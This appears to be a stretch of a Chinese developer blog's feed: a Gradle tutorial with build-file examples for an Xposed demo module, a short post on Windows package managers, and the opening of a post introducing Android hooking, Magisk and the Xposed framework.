        <content type="html"><![CDATA[<p>一句话概述，Gradle 就是一个运行在 JVM 上的自动化的项目构建工具，用来帮助我们自动构建项目。</p><p>对于开发者来说，Gradle 的主要作用主要有 3 个：</p><ol><li><strong>项目构建</strong>：提供标准的、跨平台的自动化项目构建方式。</li><li><strong>依赖管理</strong>：方便快捷的管理项目依赖的资源（jar 包），避免资源间的版本冲突问题。</li><li><strong>统一开发结构</strong>：提供标准的、统一的项目结构。</li></ol><blockquote><p>不知道从什么时候开始，现在用列表就会感觉自己是AI（汗）</p></blockquote><hr><p>Gradle是一个现代化的构建自动化工具，首次发布于2007年。它的出现是为了应对当时构建工具的局限性，尤其是Ant和Maven等工具在灵活性和可扩展性方面的不足。Gradle的设计理念是结合了这两者的优点，同时引入了更强大的功能和更灵活的构建模型。</p><p>最初，Gradle用于Java项目的构建。它采用了一种基于Groovy的领域特定语言（DSL），使得构建脚本的编写更加简洁和易于理解。Gradle的灵活性使得它能够支持多种编程语言和平台，包括但不限于Java、Groovy、Kotlin、Scala、Android等。随着时间的推移，Gradle逐渐成为Android开发的标准构建工具，Android Studio也将其作为默认构建系统。</p><blockquote><p>Groovy是一种基于Java平台的动态语言，旨在提高Java开发的生产力。它于2003年首次发布，作为一种简化Java编程的语言，Groovy结合了面向对象编程和动态编程的特性，允许开发者以更简洁和灵活的方式编写代码。</p></blockquote><p>Gradle的核心特性之一是其增量构建能力，这意味着它只会重新构建那些发生变化的部分，从而提高构建效率。此外，Gradle还支持多项目构建，允许开发者在一个构建中管理多个模块和项目，这在大型应用开发中尤为重要。在构建工具（如Gradle）、Web开发（如Grails框架）和测试（如Spock框架）等多个领域中得到了广泛使用。</p><blockquote><p>可以看看github仓库：<a href="https://github.com/gradle/gradle">Gradle GitHub Repository</a>。</p></blockquote><h2 id="gradle配置文件组成"><a href="#gradle配置文件组成" class="headerlink" title="gradle配置文件组成"></a>gradle配置文件组成</h2><p>在Gradle中，构建过程的基本组成部分包括Project和Task。每个待构建的工程被称为Project，而构建一个Project所需执行的一系列操作则被称为Task。通过这些Task，Gradle能够完成从编译到打包等一系列构建过程。</p><h3 id="Project与Task"><a href="#Project与Task" class="headerlink" title="Project与Task"></a>Project与Task</h3><p>每个Project可以包含多个Task，这些Task代表了构建过程中的不同步骤。例如，在构建一个Android应用的过程中，可能会涉及以下Task：</p><ul><li><strong>Java源码编译</strong>：将Java源代码编译成字节码。</li><li><strong>资源文件编译</strong>：处理XML、图片等资源文件。</li><li><strong>Lint检查</strong>：对代码进行静态分析，检查潜在问题。</li><li><strong>打包</strong>：将编译后的代码和资源打包成最终的APK文件。</li></ul><p>以下是一个相对完整的示例，展示了如何在<code>build.gradle</code>文件中定义Task，作用直接以注释的形式标准了，这里不再重复介绍：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义一个简单的Java项目</span></span><br><span class="line">apply <span class="attr">plugin:</span> <span class="string">&#x27;java&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个Task，用于编译Java源文件</span></span><br><span class="line">task compileJava &#123;</span><br><span class="line">    doLast &#123;</span><br><span class="line">        println <span class="string">&#x27;Compiling Java source files...&#x27;</span></span><br><span class="line">        <span class="comment">// 这里可以添加实际的编译逻辑，例如调用javac命令</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个Task，用于运行单元测试</span></span><br><span class="line">task runTests &#123;</span><br><span class="line">    dependsOn compileJava <span class="comment">// 依赖于compileJava任务</span></span><br><span class="line">    doLast &#123;</span><br><span class="line">        println <span class="string">&#x27;Running unit tests...&#x27;</span></span><br><span class="line">        <span class="comment">// 这里可以添加实际的测试逻辑，例如调用JUnit</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个Task，用于打包应用</span></span><br><span class="line">task packageApp &#123;</span><br><span class="line">    dependsOn runTests <span class="comment">// 依赖于runTests任务</span></span><br><span class="line">    doLast &#123;</span><br><span class="line">        println <span class="string">&#x27;Packaging the application into a JAR file...&#x27;</span></span><br><span class="line">        <span class="comment">// 这里可以添加实际的打包逻辑，例如调用jar命令</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个Task，用于清理构建输出</span></span><br><span class="line">task clean &#123;</span><br><span class="line">    doLast &#123;</span><br><span class="line">        println <span class="string">&#x27;Cleaning up build outputs...&#x27;</span></span><br><span class="line">        <span class="comment">// 这里可以添加实际的清理逻辑，例如删除生成的文件</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个顶级任务，用于构建整个项目</span></span><br><span class="line">task build &#123;</span><br><span class="line">    dependsOn packageApp <span class="comment">// 依赖于packageApp任务</span></span><br><span class="line">    doLast &#123;</span><br><span class="line">        println <span class="string">&#x27;Building the project...&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个任务，用于执行所有任务的顺序</span></span><br><span class="line">task fullBuild &#123;</span><br><span class="line">    dependsOn clean, build <span class="comment">// 先执行clean，再执行build</span></span><br><span class="line">    doLast &#123;</span><br><span class="line">        println <span class="string">&#x27;Full build process completed!&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h3><p>Gradle的插件系统是其强大功能的核心。插件的主要作用是定义和执行Task。为了使Gradle能够正常工作并完成构建流程，必须导入合适的插件。这些插件中定义了构建Project所需的一系列Task，并负责执行相应的Task。</p><p>在Android项目中，通常在app模块的<code>build.gradle</code>文件的第一行应用插件，例如：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apply <span class="attr">plugin:</span> <span class="string">&#x27;com.android.application&#x27;</span></span><br></pre></td></tr></table></figure><p>这行代码的意思是应用“com.android.application”插件来构建app模块。这个插件负责定义并执行Java源码编译、资源文件编译、打包等一系列Task。</p><p>在“com.android.application”插件中，定义了以下四个顶级任务：</p><ul><li><strong>assemble</strong>：构建项目的输出（APK文件）。</li><li><strong>check</strong>：进行校验工作，确保代码质量和构建的有效性。</li><li><strong>build</strong>：执行<code>assemble</code>任务和<code>check</code>任务，通常用于完整的构建过程。</li><li><strong>clean</strong>：清除项目的输出，删除生成的APK文件和其他构建产物。</li></ul><p>当我们执行一个任务时，Gradle会自动处理任务之间的依赖关系。例如，执行<code>assemble</code>任务时，Gradle会自动执行<code>assembleDebug</code>和<code>assembleRelease</code>任务，因为一个Android项目通常需要生成debug和release两个版本的APK。</p><h3 id="任务依赖示例"><a href="#任务依赖示例" class="headerlink" title="任务依赖示例"></a>任务依赖示例</h3><p>以下是一个示例，展示了如何定义任务及其依赖关系：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">task compileJava &#123;</span><br><span class="line">    doLast &#123;</span><br><span class="line">        println <span class="string">&#x27;Compiling Java source files...&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">task packageApp(<span class="attr">dependsOn:</span> compileJava) &#123;</span><br><span class="line">    doLast &#123;</span><br><span class="line">        println <span class="string">&#x27;Packaging the application...&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">task build(<span class="attr">dependsOn:</span> packageApp) &#123;</span><br><span class="line">    doLast &#123;</span><br><span class="line">        println <span class="string">&#x27;Building the project...&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个示例中，定义了三个任务：<code>compileJava</code>、<code>packageApp</code>和<code>build</code>。<code>packageApp</code>任务依赖于<code>compileJava</code>任务，而<code>build</code>任务依赖于<code>packageApp</code>任务。当执行<code>build</code>任务时，Gradle会自动执行<code>packageApp</code>和<code>compileJava</code>任务，确保构建过程的顺序。</p><h3 id="任务的执行"><a href="#任务的执行" class="headerlink" title="任务的执行"></a>任务的执行</h3><p>在命令行中，可以通过以下命令执行特定的任务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./gradlew build</span><br></pre></td></tr></table></figure><p>这条命令会触发<code>build</code>任务，Gradle会自动处理所有依赖的任务并按顺序执行。</p><h2 id="分析xposed模块的模块级build-gradle"><a href="#分析xposed模块的模块级build-gradle" class="headerlink" title="分析xposed模块的模块级build.gradle"></a>分析xposed模块的模块级build.gradle</h2><p>不必多说，直接上代码即可：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">plugins &#123;</span><br><span class="line">    <span class="comment">// 应用Android应用插件，启用Android构建功能</span></span><br><span class="line">    alias(libs.plugins.android.application) </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">android &#123;</span><br><span class="line">    <span class="comment">// 定义应用的命名空间，通常与包名相同</span></span><br><span class="line">    namespace <span class="string">&#x27;com.xposed.demo.hookdemo&#x27;</span> </span><br><span class="line">    <span class="comment">// 设置编译SDK版本为34</span></span><br><span class="line">    compileSdk <span class="number">34</span> </span><br><span class="line"></span><br><span class="line">    defaultConfig &#123;</span><br><span class="line">        <span class="comment">// 应用的唯一标识符，通常是反向域名格式</span></span><br><span class="line">        applicationId <span class="string">&quot;com.xposed.demo.hookdemo&quot;</span> </span><br><span class="line">        <span class="comment">// 设置应用支持的最低SDK版本为24（Android 7.0）</span></span><br><span class="line">        minSdk <span class="number">24</span> </span><br><span class="line">        <span class="comment">// 设置应用的目标SDK版本为34</span></span><br><span class="line">        targetSdk <span class="number">34</span> </span><br><span class="line">        <span class="comment">// 应用的版本代码，整数值，通常在每次发布时递增</span></span><br><span class="line">        versionCode <span class="number">1</span> </span><br><span class="line">        <span class="comment">// 应用的版本名称，通常是用户可见的字符串</span></span><br><span class="line">        versionName <span class="string">&quot;1.0&quot;</span> </span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置测试运行器，用于运行Android测试</span></span><br><span class="line">        testInstrumentationRunner <span class="string">&quot;androidx.test.runner.AndroidJUnitRunner&quot;</span> </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    buildTypes &#123;</span><br><span class="line">        <span class="comment">// 定义构建类型的配置</span></span><br><span class="line">        release &#123;</span><br><span class="line">            <span class="comment">// 在发布版本中禁用代码混淆</span></span><br><span class="line">            minifyEnabled <span class="keyword">false</span> </span><br><span class="line">            <span class="comment">// 指定ProGuard配置文件，使用默认的优化文件和自定义的规则文件</span></span><br><span class="line">            proguardFiles getDefaultProguardFile(<span class="string">&#x27;proguard-android-optimize.txt&#x27;</span>), <span class="string">&#x27;proguard-rules.pro&#x27;</span> </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 可以在这里添加其他构建类型，例如debug</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    compileOptions &#123;</span><br><span class="line">        <span class="comment">// 设置源代码兼容性为Java 11</span></span><br><span class="line">        <span class="keyword">sourceCompatibility</span> JavaVersion.VERSION_11 </span><br><span class="line">        <span class="comment">// 设置目标代码兼容性为Java 11</span></span><br><span class="line">        <span class="keyword">targetCompatibility</span> JavaVersion.VERSION_11 </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">dependencies</span> &#123;</span><br><span class="line">    <span class="comment">// 添加AndroidX AppCompat库作为依赖，提供向后兼容的功能</span></span><br><span class="line">    implementation libs.appcompat </span><br><span class="line">    <span class="comment">// 添加Material Design库作为依赖，提供Material组件</span></span><br><span class="line">    implementation libs.material </span><br><span class="line">    <span class="comment">// 添加JUnit库用于单元测试</span></span><br><span class="line">    testImplementation libs.junit </span><br><span class="line">    <span class="comment">// 添加扩展JUnit库用于Android测试</span></span><br><span class="line">    androidTestImplementation libs.ext.junit </span><br><span class="line">    <span class="comment">// 添加Espresso库用于UI测试</span></span><br><span class="line">    androidTestImplementation libs.espresso.core </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加Xposed API作为编译时依赖，不会打包到APK中</span></span><br><span class="line">    compileOnly <span class="string">&#x27;de.robv.android.xposed:api:82&#x27;</span> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后这里再了解下各个模块的作用（其实根据模块名就可以理解了，这里多唠唠）：</p><ul><li><strong>android { }</strong>：这个块用于定义Android项目的构建配置。所有与Android构建相关的设置都在这里进行配置。</li><li><strong>defaultConfig { }</strong>：在<code>android</code>块内，<code>defaultConfig</code>用于定义应用的基本配置。</li><li><strong>buildTypes { }</strong>：在<code>android</code>块内，<code>buildTypes</code>用于定义不同构建类型的配置。</li><li><strong>compileOptions { }</strong>：在<code>android</code>块内，<code>compileOptions</code>用于设置Java编译选项。</li><li><strong>dependencies { }</strong>：用于定义项目的依赖项，指定所需的库和框架。</li></ul><h2 id="常见的gradle配置文件"><a href="#常见的gradle配置文件" class="headerlink" title="常见的gradle配置文件"></a>常见的gradle配置文件</h2><p>这里以Android java项目为例进行介绍。</p><p>Android项目通常会有两个<code>build.gradle</code>文件：一个是项目级别的<code>build.gradle</code>，另一个是模块级别的<code>build.gradle</code>。项目级别的<code>build.gradle</code>用于配置整个项目的构建设置，包括所有模块的依赖和构建脚本，而模块级别的<code>build.gradle</code>则专注于特定模块的构建配置，如应用的SDK版本、依赖项和构建类型等。</p><h3 id="1-build-gradle-Module级别"><a href="#1-build-gradle-Module级别" class="headerlink" title="1. build.gradle (Module级别)"></a>1. <code>build.gradle</code> (Module级别)</h3><p>这个文件定义了特定模块的构建配置，包括应用的SDK版本、依赖项、构建类型等。每个模块（如app模块）都有自己的<code>build.gradle</code>文件，用于指定该模块的构建规则和依赖关系。</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">plugins &#123;</span><br><span class="line">    id <span class="string">&#x27;com.android.application&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">android &#123;</span><br><span class="line">    namespace <span class="string">&#x27;com.example.app&#x27;</span></span><br><span class="line">    compileSdk <span class="number">34</span></span><br><span class="line"></span><br><span class="line">    defaultConfig &#123;</span><br><span class="line">        applicationId <span class="string">&quot;com.example.app&quot;</span></span><br><span class="line">        minSdk <span class="number">21</span></span><br><span class="line">        targetSdk <span class="number">34</span></span><br><span class="line">        versionCode <span class="number">1</span></span><br><span class="line">        versionName <span class="string">&quot;1.0&quot;</span></span><br><span class="line">        testInstrumentationRunner <span class="string">&quot;androidx.test.runner.AndroidJUnitRunner&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    buildTypes &#123;</span><br><span class="line">        release &#123;</span><br><span class="line">            minifyEnabled <span class="literal">false</span></span><br><span class="line">            proguardFiles getDefaultProguardFile(<span class="string">&#x27;proguard-android-optimize.txt&#x27;</span>), <span class="string">&#x27;proguard-rules.pro&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    compileOptions &#123;</span><br><span class="line">        sourceCompatibility JavaVersion.VERSION_11</span><br><span class="line">        targetCompatibility JavaVersion.VERSION_11</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dependencies &#123;</span><br><span class="line">    implementation <span class="string">&#x27;androidx.appcompat:appcompat:1.3.1&#x27;</span></span><br><span class="line">    implementation <span class="string">&#x27;com.google.android.material:material:1.4.0&#x27;</span></span><br><span class="line">    testImplementation <span class="string">&#x27;junit:junit:4.13.2&#x27;</span></span><br><span class="line">    androidTestImplementation <span class="string">&#x27;androidx.test.ext:junit:1.1.3&#x27;</span></span><br><span class="line">    androidTestImplementation <span class="string">&#x27;androidx.test.espresso:espresso-core:3.4.0&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-build-gradle-项目级别"><a href="#2-build-gradle-项目级别" class="headerlink" title="2. build.gradle (项目级别)"></a>2. <code>build.gradle</code> (项目级别)</h3><p>这个文件用于配置整个项目的构建设置，包括所有模块的依赖和构建脚本。它通常包含Gradle插件的版本和全局的仓库配置。</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Top-level build file where you can add configuration options common to all sub-projects/modules.  </span></span><br><span class="line">plugins &#123;  </span><br><span class="line">alias(libs.plugins.android.application) apply <span class="literal">false</span>  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-gradle-properties"><a href="#3-gradle-properties" class="headerlink" title="3. gradle.properties"></a>3. <code>gradle.properties</code></h3><p>这个文件用于定义Gradle构建的全局属性和配置选项，例如JVM参数、AndroidX支持等。它可以帮助简化<code>build.gradle</code>文件中的配置。</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Gradle properties</span></span><br><span class="line"><span class="attr">org.gradle.jvmargs</span>=<span class="string">-Xmx2048m</span></span><br><span class="line"><span class="attr">android.useAndroidX</span>=<span class="string">true</span></span><br><span class="line"><span class="attr">android.enableJetifier</span>=<span class="string">true</span></span><br><span class="line"><span class="attr">keystoreFile</span>=<span class="string">path/to/keystore.jks</span></span><br><span class="line"><span class="attr">keyAlias</span>=<span class="string">myKeyAlias</span></span><br><span class="line"><span class="attr">keyPassword</span>=<span class="string">myKeyPassword</span></span><br><span class="line"><span class="attr">storePassword</span>=<span class="string">myStorePassword</span></span><br></pre></td></tr></table></figure><h3 id="4-gradlew-Linux-Mac"><a href="#4-gradlew-Linux-Mac" class="headerlink" title="4. gradlew (Linux&#x2F;Mac)"></a>4. <code>gradlew</code> (Linux&#x2F;Mac)</h3><p>这是Gradle Wrapper的脚本文件，允许用户在没有全局安装Gradle的情况下运行Gradle命令。它确保使用项目中指定的Gradle版本。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env sh</span></span><br><span class="line"><span class="comment"># Gradle wrapper script for Unix</span></span><br><span class="line">GRADLE_VERSION=7.0.4</span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$GRADLE_HOME</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    GRADLE_HOME=<span class="string">&quot;<span class="variable">$PWD</span>/gradle-<span class="variable">$GRADLE_VERSION</span>&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">exec</span> <span class="string">&quot;<span class="variable">$GRADLE_HOME</span>/bin/gradle&quot;</span> <span class="string">&quot;<span class="variable">$@</span>&quot;</span></span><br></pre></td></tr></table></figure><h3 id="5-gradlew-bat-Windows"><a href="#5-gradlew-bat-Windows" class="headerlink" title="5. gradlew.bat (Windows)"></a>5. <code>gradlew.bat</code> (Windows)</h3><p>这是Windows系统下的Gradle Wrapper批处理文件，功能与<code>gradlew</code>相同，允许在没有全局安装Gradle的情况下运行Gradle命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">setlocal</span><br><span class="line">set GRADLE_VERSION=7.0.4</span><br><span class="line">if &quot;%GRADLE_HOME%&quot;==&quot;&quot; (</span><br><span class="line">    set GRADLE_HOME=%~dp0gradle-%GRADLE_VERSION%</span><br><span class="line">)</span><br><span class="line">&quot;%GRADLE_HOME%\bin\gradle&quot; %*</span><br><span class="line">endlocal</span><br></pre></td></tr></table></figure><h3 id="6-local-properties"><a href="#6-local-properties" class="headerlink" title="6. local.properties"></a>6. <code>local.properties</code></h3><p>这个文件用于定义本地属性，例如Android SDK的路径。它通常在本地开发环境中使用，确保Gradle能够找到SDK。这个文件不应被版本控制，因为它包含特定于开发者的配置。</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">sdk.dir</span>=<span class="string">/Users/username/Library/Android/sdk</span></span><br></pre></td></tr></table></figure><h3 id="7-settings-gradle"><a href="#7-settings-gradle" class="headerlink" title="7. settings.gradle"></a>7. <code>settings.gradle</code></h3><p>这个文件用于定义项目中包含的模块。它允许Gradle一次性构建所有模块，适用于多模块项目。</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">include <span class="string">&#x27;:app&#x27;</span></span><br><span class="line">include <span class="string">&#x27;:ModuleA&#x27;</span></span><br><span class="line">include <span class="string">&#x27;:ModuleB&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><ul><li><a href="https://javaguide.cn/tools/gradle/gradle-core-concepts.html">Gradle核心概念总结 | JavaGuide</a></li><li><a href="https://www.supremepole.com/cs/other/build-tool/gradle/intro.html">Gradle介绍 | 尼尔的编程专栏</a></li><li><a href="https://www.cnblogs.com/Im-Victor/p/10787729.html">十分钟理解Gradle - mingruqi - 博客园</a></li><li><a href="https://dyzhou.gitbooks.io/gradle-learning/content/gradleji_chu_yu_fa.html">gradle基础语法 | gradle学习笔记</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Development </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Gradle </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windwos包管理器：scoop/winget/choco</title>
      <link href="/2025/01/14/2025/windows-package-manager/"/>
      <url>/2025/01/14/2025/windows-package-manager/</url>
      
        <content type="html"><![CDATA[<p>这半年从Linux换回了Windows，实际体验也不差。</p><p>CLI着方面确实没得比，Powershell只要稍微美化下或添加插件就会大幅拖慢启动速度，这个没办法，我现在的解决方法就是终端默认启动WSL2，有事情需要在windows下做的时候再切换到Powershell。</p><p>最近也探究了下windows的包管理器，惊奇的发现winget、scoop意外地好用，我实际体验是不比apt和yum之流差多少（当然和AUR没得比）。之前的博客带过一部分对包管理器的介绍，原理上也大致相同，这里不再赘述，本来想着写写winget、scoop、chocolatey的安装和基本使用，结果搜文档的时候找到一篇博客，相当全面，我想了想没什么需要补充的，这里就干脆贴个链接了：</p><ul><li><a href="https://www.wangwangit.com/%E6%95%99%E4%BD%A0%E7%94%A8%E5%A5%BDWindows%E6%9C%80%E5%BC%BA%E5%8C%85%E7%AE%A1%E7%90%86%E5%99%A8/">教你用好Windows最强包管理器🚀 - 一只会飞的旺旺-IT技术分享</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Development </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> Package Manager </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android Hook与简单的xposed模块开发实例</title>
      <link href="/2025/01/11/2025/androidhook-xposed-module/"/>
      <url>/2025/01/11/2025/androidhook-xposed-module/</url>
      
        <content type="html"><![CDATA[<p>Hook是一种在特定事件或操作发生时插入自定义代码的编程技术。在前端开发中，例如Vue和Angular的生命周期钩子，体现了Hook的机制，允许开发者在组件的不同阶段执行代码，提升代码的模块化和可重用性。</p><p>Android Hook与此类似，允许开发者在Android应用程序运行时修改或扩展现有功能。通过拦截方法调用、修改参数或返回值，Hook可用于调试、测试和逆向工程，例如监控应用程序行为、捕获API调用，或在不修改源代码的情况下添加新功能，以及替换so模块以实现获取验证码或广告拦截等功能。</p><blockquote><p>在快写完这篇博客的时候，我才发现我想要实现的功能不需要Android Hook即可实现…不过不耽误我对这方面做一些了解，所以接着写完了。</p></blockquote><h2 id="补充知识"><a href="#补充知识" class="headerlink" title="补充知识"></a>补充知识</h2><p>前几天刷机的时候基本算是闷头跟着教程走，中间还险些变砖。虽然过程中我边操作边了解，但也是比较粗糙，这里再补充点知识并做做记录。</p><h3 id="Magisk工具"><a href="#Magisk工具" class="headerlink" title="Magisk工具"></a>Magisk工具</h3><p>现在的刷机教程一般都会引导读者在root后安装Magisk，乍看上去是个工具包，集合了很多功能，那这个“面具”具体是什么，有什么用呢？</p><p>Magisk是一款流行的Android系统级root工具，由XDA开发者topjohnwu创建和维护。与传统的root方法不同，Magisk采用了一种“无系统”的方式，这意味着它不会直接修改系统分区中的文件，而是通过修改boot镜像来实现root权限。这种方法的好处在于它能够更好地兼容系统更新，避免root权限导致的系统不稳定或应用崩溃。Magisk的“无系统”特性也使得它能够更好地隐藏root权限，从而绕过一些应用的root检测机制，例如Google的SafetyNet。</p><p>Magisk的核心功能是提供root权限，允许用户访问和修改系统文件，以及安装各种Magisk模块来扩展系统功能。这些模块可以实现各种各样的功能，例如自定义系统UI、增强系统性能、拦截广告、修改系统设置等等。Magisk还提供了一个Magisk Manager应用，方便用户管理root权限和Magisk模块。Magisk的持续更新和强大的社区支持，使其成为Android用户中非常受欢迎的root工具。  Magisk的出现，很大程度上简化了root流程，并提升了root后的系统稳定性和安全性。</p><h3 id="Xposed框架"><a href="#Xposed框架" class="headerlink" 